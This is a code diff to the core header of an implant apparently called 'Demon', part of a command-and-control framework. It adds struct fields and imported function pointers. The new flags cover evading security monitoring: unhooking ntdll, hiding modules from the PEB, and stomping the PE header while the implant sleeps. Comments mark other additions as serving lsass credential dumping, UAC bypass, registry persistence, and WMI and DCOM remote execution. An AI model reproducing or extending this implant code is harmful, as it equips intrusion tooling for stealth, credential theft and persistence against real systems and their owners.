@@ -85,6 +85,7 @@ typedef struct
         WORD  OS_Arch;
         WORD  Process_Arch;
         DWORD OSVersion;
+        BOOL  bNtdllUnhooked;    /* set by DemonInit: TRUE = UnhookNtdll() succeeded */
     } Session;
 
     struct {
@@ -149,6 +150,10 @@ typedef struct
             BOOL  CoffeeThreaded;
             BOOL  CoffeeVeh;
             ULONG DownloadChunkSize;
+            BOOL  RandGadget;           /* TRUE = random gadget per cycle; FALSE = first match (default) */
+            BOOL  UnhookNtdll;          /* TRUE = overwrite loaded ntdll .text with clean KnownDlls copy at init */
+            BOOL  HideModules;          /* TRUE = unlink loaded modules from PEB LDR lists after load */
+            BOOL  PeStomp;              /* TRUE = stomp PE header during sleep; FALSE = skip (safe for injection) */
         } Implant;
 
         struct {
@@ -191,6 +196,7 @@ typedef struct
         WIN_FUNC( RtlNtStatusToDosError )
         WIN_FUNC( RtlGetVersion )
         WIN_FUNC( RtlExitUserThread )
+        PVOID    RtlUserThreadStart;
         WIN_FUNC( RtlExitUserProcess )
         WIN_FUNC( RtlCreateTimer )
         WIN_FUNC( RtlRegisterWait )
@@ -305,6 +311,14 @@ typedef struct
         WIN_FUNC( WriteConsoleA )
         HGLOBAL ( *GlobalFree ) ( HGLOBAL );
 
+        /* [HVC-032] Kernel32 — snapshot / path (creds lsass, UAC bypass) */
+        WIN_FUNC( GetTempPathW )
+        /* PssCaptureSnapshot/PssFreeSnapshot are Win8.1+ (processsnapshot.h).
+         * WIN_FUNC(__typeof__) cannot resolve them when _WIN32_WINNT < 0x0603,
+         * so store as PVOID and cast at call time via fnPssCaptureSnapshot. */
+        PVOID PssCaptureSnapshot;
+        PVOID PssFreeSnapshot;
+
         /* WinHttp.dll */
         WIN_FUNC( WinHttpOpen )
         WIN_FUNC( WinHttpConnect )
@@ -363,6 +377,19 @@ typedef struct
         WIN_FUNC( RegQueryValueExW )
         WIN_FUNC( RegCloseKey )
 
+        /* [HVC-032] Registry — persistence, credential access, privilege escalation */
+        WIN_FUNC( RegSetValueExW )
+        WIN_FUNC( RegSaveKeyExW )
+        WIN_FUNC( RegDeleteValueW )
+        WIN_FUNC( RegCreateKeyExW )
+        WIN_FUNC( RegDeleteTreeW )
+
+        /* [HVC-032] Ole32 — COM (WMI exec, DCOM exec, schtask) */
+        WIN_FUNC( CoInitializeEx )
+        WIN_FUNC( CoCreateInstance )
+        WIN_FUNC( CoCreateInstanceEx )
+        WIN_FUNC( CoUninitialize )
+
 #ifdef SLEEPOBF_USE_FOLIAGE
         WIN_FUNC( ConvertThreadToFiberEx )
         WIN_FUNC( ConvertFiberToThread )
@@ -389,6 +416,7 @@ typedef struct
 
         // * MISC *
         WIN_FUNC( CommandLineToArgvW )
+        WIN_FUNC( ShellExecuteW )       /* [HVC-032] shell32 — UAC bypass launcher */
 
         WIN_FUNC( AllocConsole )
         WIN_FUNC( FreeConsole )
@@ -400,7 +428,7 @@ typedef struct
         WIN_FUNC( GetAdaptersInfo )
 
         WIN_FUNC( WaitForSingleObjectEx )
-
+        PVOID    BaseThreadInitThunk;
 
         // Screenshot
         WIN_FUNC( GetSystemMetrics )
@@ -542,6 +570,7 @@ typedef struct
         PVOID Ntdll;
         PVOID Kernel32;
         PVOID Advapi32;
+        PVOID Ole32;        /* [HVC-032] CoInitializeEx/CoCreateInstance/CoUninitialize */
         PVOID Mscoree;
         PVOID Oleaut32;
         PVOID User32;
